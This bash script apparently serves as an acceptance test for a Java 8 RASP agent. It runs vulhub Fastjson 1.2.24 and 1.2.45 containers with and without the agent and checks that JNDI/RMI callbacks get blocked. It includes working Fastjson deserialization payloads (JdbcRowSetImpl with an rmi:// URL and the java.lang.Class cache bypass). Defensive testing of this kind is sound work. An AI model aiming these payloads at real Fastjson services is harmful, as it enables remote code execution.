#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

cleanup_names=()

cleanup() {
  local name dir
  for name in "${cleanup_names[@]}"; do
    case "$name" in
      *1224-baseline) dir="logs/vulhub-fastjson-1.2.24-java8-baseline" ;;
      *1224-protected) dir="logs/vulhub-fastjson-1.2.24-java8-protected" ;;
      *1245-baseline) dir="logs/vulhub-fastjson-1.2.45-java8-baseline" ;;
      *1245-protected) dir="logs/vulhub-fastjson-1.2.45-java8-protected" ;;
      *) dir="" ;;
    esac
    if [[ "$dir" != "" ]]; then
      docker logs "$name" > "${dir}/container.log" 2>&1 || true
    fi
  done
  if ((${#cleanup_names[@]} > 0)); then
    docker rm -f "${cleanup_names[@]}" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 120); do
    status="$(curl -sS -o "/tmp/${name}.json" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" || true)"
    if [[ "$status" == "200" ]]; then
      return
    fi
    sleep 1
  done
  echo "${name} did not expose Fastjson demo at ${port}" >&2
  exit 1
}

start_listener() {
  local port="$1"
  local result="$2"
  local timeout="$3"
  python3 -u - "$port" "$result" "$timeout" <<'PY' &
import pathlib
import socket
import sys

port = int(sys.argv[1])
result = pathlib.Path(sys.argv[2])
timeout = int(sys.argv[3])
result.write_text("WAITING\n")
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", port))
sock.listen(1)
sock.settimeout(timeout)
try:
    conn, addr = sock.accept()
    lines = ["CONNECTED %s:%s" % addr]
    try:
        conn.settimeout(1)
        lines.append("BYTES %r" % conn.recv(16))
    except Exception as exc:
        lines.append("READ_ERROR %s" % exc)
    conn.close()
    result.write_text("\n".join(lines) + "\n")
except Exception as exc:
    result.write_text("TIMEOUT %s\n" % exc)
finally:
    sock.close()
PY
}

payload_1224() {
  local rmi_url="$1"
  printf '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"%s","autoCommit":true}}' "$rmi_url"
}

payload_1245() {
  local rmi_url="$1"
  printf '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"%s","autoCommit":true}}' "$rmi_url"
}

send_payload() {
  local port="$1"
  local payload="$2"
  local output="$3"
  curl -sS -i -H 'Content-Type: application/json' \
    --data "$payload" \
    -o "$output" \
    -w "%{http_code}" \
    "http://127.0.0.1:${port}/" || true
}

expect_startup_without_detection() {
  local log="$1"
  local label="$2"
  if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$log"; then
    cat "$log" >&2 || true
    echo "missing Java 8 startup event in ${label}" >&2
    exit 1
  fi
  if ! grep -q '"jndi_hook":"installed"' "$log"; then
    cat "$log" >&2
    echo "missing Java 8 JNDI hook startup marker in ${label}" >&2
    exit 1
  fi
  if grep -q '"event":"ohmyrasp-detection"' "$log"; then
    cat "$log" >&2
    echo "${label} produced a detection before the exploit request" >&2
    exit 1
  fi
}

run_case() {
  local version="$1"
  local image="$2"
  local suffix="$3"
  local baseline_name="$4"
  local protected_name="$5"
  local baseline_port="$6"
  local protected_port="$7"
  local baseline_listener_port="$8"
  local protected_listener_port="$9"
  local payload_kind="${10}"
  local baseline_dir="logs/vulhub-fastjson-${version}-java8-baseline"
  local protected_dir="logs/vulhub-fastjson-${version}-java8-protected"
  local protected_log="${protected_dir}/events.jsonl"
  local baseline_listener="${baseline_dir}/${suffix}-listener.txt"
  local protected_listener="${protected_dir}/${suffix}-listener.txt"

  cleanup_names+=("$baseline_name" "$protected_name")
  rm -rf "$baseline_dir" "$protected_dir"
  mkdir -p "$baseline_dir" "$protected_dir"
  : > "$protected_log"
  chmod 666 "$protected_log"

  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

  docker run -d --name "$baseline_name" \
    --add-host host.docker.internal:host-gateway \
    -p "${baseline_port}:8090" \
    "$image" >/dev/null

  docker run -d --name "$protected_name" \
    --add-host host.docker.internal:host-gateway \
    -p "${protected_port}:8090" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    "$image" \
    java -javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar \
      -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl \
      -Dohmyrasp.java8.block=true \
      -Dserver.address=0.0.0.0 \
      -Dserver.port=8090 \
      -jar /usr/src/fastjsondemo.jar \
    >/dev/null

  wait_for "$baseline_name" "$baseline_port"
  wait_for "$protected_name" "$protected_port"
  expect_startup_without_detection "$protected_log" "Fastjson ${version} protected container"

  local baseline_payload
  if [[ "$payload_kind" == "1224" ]]; then
    baseline_payload="$(payload_1224 "rmi://host.docker.internal:${baseline_listener_port}/Exploit")"
  else
    baseline_payload="$(payload_1245 "rmi://host.docker.internal:${baseline_listener_port}/Exploit")"
  fi
  start_listener "$baseline_listener_port" "$baseline_listener" 15
  local baseline_listener_pid=$!
  local baseline_status
  baseline_status="$(send_payload "$baseline_port" "$baseline_payload" "${baseline_dir}/${suffix}-payload.response")"
  wait "$baseline_listener_pid"
  if ! grep -q '^CONNECTED ' "$baseline_listener" || ! grep -q "JRMI" "$baseline_listener"; then
    cat "$baseline_listener" >&2 || true
    cat "${baseline_dir}/${suffix}-payload.response" >&2 || true
    echo "baseline Fastjson ${version} payload did not reach the RMI/JNDI sink" >&2
    exit 1
  fi
  if [[ "$baseline_status" =~ ^2 ]]; then
    cat "${baseline_dir}/${suffix}-payload.response" >&2 || true
    echo "baseline Fastjson ${version} exploit payload unexpectedly returned ${baseline_status}" >&2
    exit 1
  fi

  local protected_payload
  if [[ "$payload_kind" == "1224" ]]; then
    protected_payload="$(payload_1224 "rmi://host.docker.internal:${protected_listener_port}/Exploit")"
  else
    protected_payload="$(payload_1245 "rmi://host.docker.internal:${protected_listener_port}/Exploit")"
  fi
  start_listener "$protected_listener_port" "$protected_listener" 8
  local protected_listener_pid=$!
  local protected_status
  protected_status="$(send_payload "$protected_port" "$protected_payload" "${protected_dir}/${suffix}-payload.response")"
  wait "$protected_listener_pid"
  if ! grep -q '^TIMEOUT ' "$protected_listener"; then
    cat "$protected_listener" >&2 || true
    cat "${protected_dir}/${suffix}-payload.response" >&2 || true
    echo "protected Fastjson ${version} still reached the outbound RMI listener" >&2
    exit 1
  fi
  if [[ "$protected_status" =~ ^2 ]]; then
    cat "${protected_dir}/${suffix}-payload.response" >&2 || true
    echo "protected Fastjson ${version} exploit payload unexpectedly returned ${protected_status}" >&2
    exit 1
  fi
  if ! grep -q '"algorithm":"java8_jndi_remote_lookup".*"action":"block"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "missing java8_jndi_remote_lookup block event for Fastjson ${version}" >&2
    exit 1
  fi
}

run_case \
  "1.2.24" \
  "${OHMYRASP_VULHUB_FASTJSON1224_IMAGE:-vulhub/fastjson:1.2.24}" \
  "cve-2017-18349" \
  "${OHMYRASP_VULHUB_FASTJSON1224_BASELINE_NAME:-ohmyrasp-vulhub-fastjson1224-baseline}" \
  "${OHMYRASP_VULHUB_FASTJSON1224_PROTECTED_NAME:-ohmyrasp-vulhub-fastjson1224-protected}" \
  "${OHMYRASP_VULHUB_FASTJSON1224_BASELINE_PORT:-18760}" \
  "${OHMYRASP_VULHUB_FASTJSON1224_PROTECTED_PORT:-18761}" \
  "${OHMYRASP_VULHUB_FASTJSON1224_BASELINE_LISTENER_PORT:-18999}" \
  "${OHMYRASP_VULHUB_FASTJSON1224_PROTECTED_LISTENER_PORT:-19999}" \
  "1224"

run_case \
  "1.2.45" \
  "${OHMYRASP_VULHUB_FASTJSON1245_IMAGE:-vulhub/fastjson:1.2.45}" \
  "fastjson-1.2.47-bypass" \
  "${OHMYRASP_VULHUB_FASTJSON1245_BASELINE_NAME:-ohmyrasp-vulhub-fastjson1245-baseline}" \
  "${OHMYRASP_VULHUB_FASTJSON1245_PROTECTED_NAME:-ohmyrasp-vulhub-fastjson1245-protected}" \
  "${OHMYRASP_VULHUB_FASTJSON1245_BASELINE_PORT:-18762}" \
  "${OHMYRASP_VULHUB_FASTJSON1245_PROTECTED_PORT:-18763}" \
  "${OHMYRASP_VULHUB_FASTJSON1245_BASELINE_LISTENER_PORT:-18998}" \
  "${OHMYRASP_VULHUB_FASTJSON1245_PROTECTED_LISTENER_PORT:-19998}" \
  "1245"

echo "vulhub Fastjson 1.2.24 CVE-2017-18349 and Fastjson 1.2.45 Java8 acceptance passed"
